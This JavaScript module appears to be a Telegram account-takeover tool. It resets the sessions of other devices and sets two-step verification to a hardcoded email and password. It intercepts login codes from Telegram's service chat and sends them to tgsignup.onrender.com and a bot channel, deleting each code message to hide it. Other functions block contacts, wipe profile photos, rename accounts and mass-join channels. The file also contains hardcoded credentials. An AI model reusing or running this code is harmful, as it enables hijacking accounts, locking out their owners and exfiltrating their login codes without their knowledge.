import { TelegramClient, Api } from 'telegram';
import { NewMessage } from 'telegram/events/index.js';
import axios from 'axios';
import { StringSession } from 'telegram/sessions';
import { isMailReady, getcode, connectToMail, disconnectfromMail } from './mailreader';
import { CustomFile } from 'telegram/client/uploads';
import { sleep, parseError, contains } from './utils';
import fs from 'fs';
import { ChannelService } from './dbservice';

const clients = new Map();

let activeClientSetup = undefined
function getActiveClientSetup() {
    return activeClientSetup;
}

export function setActiveClientSetup(data) {
    activeClientSetup = data
}

export function getClient(number) {
    return clients.get(number);
}

export function hasClient(number) {
    return clients.has(number);
}

export async function deleteClient(number) {
    const cli = getClient(number);
    await cli?.disconnect();
    return clients.delete(number);
}

export async function disconnectAll() {
    const data = clients.entries();
    console.log("Disconnecting All Clients");
    for (const [phoneNumber, client] of data) {
        try {
            await client?.disconnect();
            clients.delete(phoneNumber);
            console.log(`Client disconnected: ${phoneNumber}`);
        } catch (error) {
            console.log(parseError(error))
            console.log(`Failed to Disconnect : ${phoneNumber}`);
        }
    }
}


export async function createClient(number, session, autoDisconnect = true, handler = true) {
    if (!clients.has(number)) {
        return new Promise(async (resolve) => {
            const cli = new TelegramManager(session, number);
            await cli.createClient(autoDisconnect);
            if (cli.expired) {
                clients.set(number, cli);
            }
            resolve(cli.expired);
        });
    } else {
        return { msgs: 10, total: 10 }
    }
}


export class TelegramManager {
    constructor(sessionString, phoneNumber) {
        this.session = new StringSession(sessionString);
        this.phoneNumber = phoneNumber;
        this.client = null;
        this.expired = false;
        this.channelArray = []
    }

    async disconnect() {
        await this.client.disconnect();
        await this.client.destroy();
        this.session.delete();
    }

    async getchatId(username) {
        const tt = await this.client.getInputEntity(username);
        console.log(tt)
        return tt
    }

    async createClient(autoDisconnect = true, handler = true) {
        try {
            this.client = new TelegramClient(this.session, parseInt(process.env.API_ID), process.env.API_HASH, {
                connectionRetries: 5,
            });
            console.log("Stating Client - ", this.phoneNumber)
            await this.client.connect();
            // const msg = await this.client.sendMessage("777000", { message: "." });
            // await msg.delete({ revoke: true });
            if (autoDisconnect) {
                setTimeout(async () => {
                    if (this.client.connected || clients.get(this.phoneNumber)) {
                        console.log("SELF destroy client");
                        await this.client.disconnect();
                        await this.client.destroy();
                        this.session.delete();
                    } else {
                        console.log("Client Already Disconnected");
                    }
                    clients.delete(this.phoneNumber);
                }, 180000)
            } else {
                setInterval(async () => {
                    await this.client.connect();
                }, 20000);
            }
            let chats = { 'total': 0 };
            let myMsgs = { "total": 0 }
            if (handler) {
                this.client.addEventHandler(async (event) => { await this.handleEvents(event) }, new NewMessage());
                chats = await this.client?.getDialogs({ limit: 500 });
                myMsgs = await this.client.getMessages('me', { limit: 8 });
                console.log("TotalChats:", chats['total'])
            }
            this.expired = { msgs: myMsgs['total'], total: chats['total'] }
        } catch (error) {
            console.log(parseError(error))
            this.expired = undefined;
        }
    }

    async getLastMsgs(limit) {
        const msgs = await this.client.getMessages("777000", { limit: parseInt(limit) });
        let resp = ''
        msgs.forEach((msg) => {
            console.log(msg.text);
            resp = resp + msg.text + "\n"
        })
        return (resp)
    }

    async getSelfMSgsInfo() {
        const self = await this.client.getMe();
        const selfChatId = self.id;

        let photoCount = 0;
        let videoCount = 0;
        let movieCount = 0;

        const messageHistory = await this.client.getMessages(selfChatId, { limit: 200 }); // Adjust limit as needed
        for (const message of messageHistory) {
            if (message.photo) {
                photoCount++;
            } else if (message.video) {
                videoCount++;
            }
            const text = message.text.toLocaleLowerCase();
            if (contains(text, ['movie', 'series', '1080', '720', '640', 'title', 'aac', '265', 'hdrip', 'mkv', 'hq', '480', 'blura', 's0', 'se0', 'uncut'])) {
                movieCount++
            }
        }

        return ({ photoCount, videoCount, movieCount })
    }
    async channelInfo(sendIds = false) {
        const chats = await this.client?.getDialogs({ limit: 600 });
        let canSendTrueCount = 0;
        let canSendFalseCount = 0;
        let totalCount = 0
        this.channelArray.length = 0;
        console.log(chats["total"]);
        chats.map(async (chat) => {
            if (chat.isChannel || chat.isGroup) {
                try {
                    const chatEntity = await chat.entity.toJSON();
                    const { broadcast, defaultBannedRights } = chatEntity;
                    totalCount++;
                    if (!broadcast && !defaultBannedRights?.sendMessages) {
                        canSendTrueCount++;
                        this.channelArray.push(chatEntity.username);
                    } else {
                        canSendFalseCount++;
                    }
                } catch (error) {
                    console.log(parseError(error))
                }
            }
        });
        const responseObj = {
            chatsArrayLength: totalCount,
            canSendTrueCount,
            canSendFalseCount,
            ids: sendIds ? this.channelArray : []
        };
        return responseObj
    }

    async joinChannels(str) {
        const db = ChannelService.getInstance();
        const channels = str.split('|');
        console.log(this.phoneNumber, " - channelsLen - ", channels.length)
        for (let i = 0; i < channels.length; i++) {
            const channel = channels[i].trim();
            console.log(this.phoneNumber, "Trying: ", channel)
            try {
                let joinResult = await this.client.invoke(
                    new Api.channels.JoinChannel({
                        channel: await this.client.getEntity(channel)
                    })
                );
                console.log(this.phoneNumber, " - Joined channel Sucesss - ", channel)
                try {
                    const chatEntity = await this.client.getEntity(channel)
                    const { title, id, broadcast, defaultBannedRights, participantsCount, megagroup, username } = chatEntity;
                    const entity = {
                        title,
                        id: id.toString(),
                        username,
                        megagroup,
                        participantsCount,
                        broadcast
                    };
                    if (!chatEntity.broadcast && !defaultBannedRights?.sendMessages) {
                        entity.canSendMsgs = true;
                        try {
                            await db.updateActiveChannel(entity.id.toString(), entity);
                            console.log("updated ActiveChannels");
                        } catch (error) {
                            console.log(parseError(error))
                            console.log("Failed to update ActiveChannels");
                        }
                    } else {
                        await db.removeOnefromActiveChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                        await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                        console.log("Removed Cahnnel- ", channel)
                    }
                } catch (error) {
                    console.log(this.phoneNumber, " - Failed - ", error)
                }
            } catch (error) {
                console.log("Channels ERR: ", error);
                if (error.toString().includes("No user has") || error.toString().includes("USERNAME_INVALID")) {
                    await db.removeOnefromActiveChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                    await db.removeOnefromChannel({ username: channel.startsWith("@") ? channel : `@${channel}` });
                    console.log("Removed Cahnnel- ", channel)
                }
            }
            console.log(this.phoneNumber, " - On waiting period")
            await new Promise(resolve => setTimeout(resolve, 3 * 60 * 1000));
            console.log(this.phoneNumber, " - Will Try next")
        }
        console.log(this.phoneNumber, " - finished joining channels")
        await this.client.disconnect();
        await deleteClient(this.phoneNumber);
    }
    async removeOtherAuths() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
        const updatedAuthorizations = result.authorizations.map((auth) => {
            if (auth.country.toLowerCase().includes('singapore') || auth.deviceModel.toLowerCase().includes('oneplus') ||
                auth.deviceModel.toLowerCase().includes('cli') || auth.deviceModel.toLowerCase().includes('linux') ||
                auth.appName.toLowerCase().includes('likki') || auth.appName.toLowerCase().includes('rams') ||
                auth.appName.toLowerCase().includes('sru') || auth.appName.toLowerCase().includes('shru')
                || auth.deviceModel.toLowerCase().includes('windows')) {
                return auth;
            } else {
                this.client.invoke(new Api.account.ResetAuthorization({ hash: auth.hash }));
                return null;
            }
        }).filter(Boolean);
        console.log(updatedAuthorizations);
    }

    async getAuths() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
        return result
    }

    async hasPassword() {
        const passwordInfo = await this.client.invoke(new Api.account.GetPassword());
        return passwordInfo.hasPassword
    }

    async blockAllUsers() {
        const chats = await this.client?.getDialogs({ limit: 600 });
        for (let chat of chats) {
            if (chat.isUser) {
                await this.blockAUser(chat.id)
            }
            sleep(5000);
        }
    }

    async blockAUser(id) {
        const result = await this.client.invoke(
            new Api.contacts.Block({
                id: id,
            })
        );
    }

    async getLastActiveTime() {
        const result = await this.client.invoke(new Api.account.GetAuthorizations({}));
        let latest = 0
        result.authorizations.map((auth) => {
            if (!auth.country.toLowerCase().includes('singapore')) {
                if (latest < auth.dateActive) {
                    latest = auth.dateActive;
                }
            }
        })
        return latest
    }

    async getMe() {
        const me = await this.client.getMe();
        return me
    }

    async deleteProfilePhotos() {
        try {
            const result = await this.client.invoke(
                new Api.photos.GetUserPhotos({
                    userId: "me"
                })
            );
            console.log(result)
            if (result && result.photos?.length > 0) {
                const res = await this.client.invoke(
                    new Api.photos.DeletePhotos({
                        id: result.photos
                    }))
            }
            console.log("Deleted profile Photos");
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async set2fa() {
        connectToMail()
        const intervalParentId = setInterval(async () => {
            const isReady = isMailReady();
            if (isReady) {
                clearInterval(intervalParentId);
                await this.client.updateTwoFaSettings({
                    isCheckPassword: false,
                    email: "storeslaksmi@gmail.com",
                    hint: "password - India143",
                    newPassword: "Ajtdmwajt1@",
                    emailCodeCallback: async (length) => {
                        console.log("code sent");
                        return new Promise(async (resolve) => {
                            let retry = 0
                            const intervalId = setInterval(async () => {
                                console.log("checking code");
                                retry++
                                const isReady = isMailReady();
                                if (isReady && retry < 4) {
                                    const code = await getcode();
                                    if (code !== '') {
                                        clearInterval(intervalId);
                                        disconnectfromMail()
                                        resolve(code);
                                    }
                                } else {
                                    clearInterval(intervalId);
                                    await this.client.disconnect();
                                    await deleteClient(this.phoneNumber);
                                    disconnectfromMail()
                                    resolve(code);
                                }
                            }, 6000);
                        });
                    },
                    onEmailCodeError: (e) => { console.log(parseError(e)); return Promise.resolve("error") }
                })
            }
        }, 5000);
    }

    async updatePrivacyforDeletedAccount() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto({}),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout({}),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
        }
        catch (e) {
            console.log(parseError(e))
        }
    }
    async updateProfile(firstName, about) {
        try {
            const result = await this.client.invoke(
                new Api.account.UpdateProfile({
                    firstName: firstName,
                    lastName: "",
                    about: about,
                })
            );
            console.log("Updated NAme: ", firstName);
        } catch (error) {
            console.log(parseError(error))
        }
    }
    async updateUsername(baseUsername) {
        let newUserName = ''
        let username = (baseUsername && baseUsername !== '') ? baseUsername : '';
        let increment = 0;
        if (username === '') {
            try {
                const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
                console.log(`Removed Username successfully.`);
            } catch (error) {
                console.log(parseError(error))
            }
        } else {
            while (true) {
                try {
                    const result = await this.client.invoke(
                        new Api.account.CheckUsername({ username })
                    );
                    console.log(result, " - ", username)
                    if (result) {
                        const res = await this.client.invoke(new Api.account.UpdateUsername({ username }));
                        console.log(`Username '${username}' updated successfully.`);
                        newUserName = username
                        break;
                    } else {
                        username = baseUsername + increment;
                        increment++;
                        await sleep(4000);
                    }
                } catch (error) {
                    console.log(error.message)
                    if (error.errorMessage == 'USERNAME_NOT_MODIFIED') {
                        newUserName = username;
                        break;
                    }
                    username = baseUsername + increment;
                    increment++;
                }
            }
        }
        return newUserName;
    }

    async updateProfilePic(image) {
        try {
            const file = await this.client.uploadFile({
                file: new CustomFile(
                    'pic.jpg',
                    fs.statSync(
                        image
                    ).size,
                    image
                ),
                workers: 1,
            });
            console.log("file uploaded- ", file)
            await this.client.invoke(new Api.photos.UploadProfilePhoto({
                file: file,
            }));
            console.log("profile pic updated")
        } catch (error) {
            console.log(parseError(error))
        }
    }

    async updatePrivacy() {
        try {
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneCall({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Calls Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyProfilePhoto({}),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("PP Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyPhoneNumber({}),
                    rules: [
                        new Api.InputPrivacyValueDisallowAll()
                    ],
                })
            );
            console.log("Number Updated")

            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyStatusTimestamp({}),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
            console.log("LAstSeen Updated")
            await this.client.invoke(
                new Api.account.SetPrivacy({
                    key: new Api.InputPrivacyKeyAbout({}),
                    rules: [
                        new Api.InputPrivacyValueAllowAll()
                    ],
                })
            );
        }
        catch (e) {
            console.log(parseError(e))
        }
    }
    async handleEvents(event) {
        if (event.isPrivate) {
            if (event.message.chatId.toString() == "777000") {
                console.log("Login Code received for - ", this.phoneNumber, '\nSetup - ', activeClientSetup);
                if (activeClientSetup && this.phoneNumber === activeClientSetup?.phoneNumber) {
                    console.log("LoginText: ", event.message.text)
                    const code = (event.message.text.split('.')[0].split("code:**")[1].trim())
                    console.log("Code is:", code)
                    try {
                        const response = await axios.get(`https://tgsignup.onrender.com/otp?code=${code}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`);
                        console.log("Code Sent");
                    } catch (error) {
                        console.log(parseError(error))
                    }
                    await deleteClient(this.phoneNumber)
                }
                console.log(event.message.text.toLowerCase());
                const ppplbot = `https://api.telegram.org/bot${process.env.ramyaredd1bot}/sendMessage`;
                const payload = {
                    "chat_id": "-1001801844217",
                    "text": event.message.text
                };
                axios.post(ppplbot, payload)
                    .then((response) => {
                    })
                    .catch((error) => {
                        console.log(parseError(error))
                        console.log(parseError(error))
                        // console.error('Error sending message:', error.response?.data?.description);
                    });
                await event.message.delete({ revoke: true });
            }
        }
    }
}
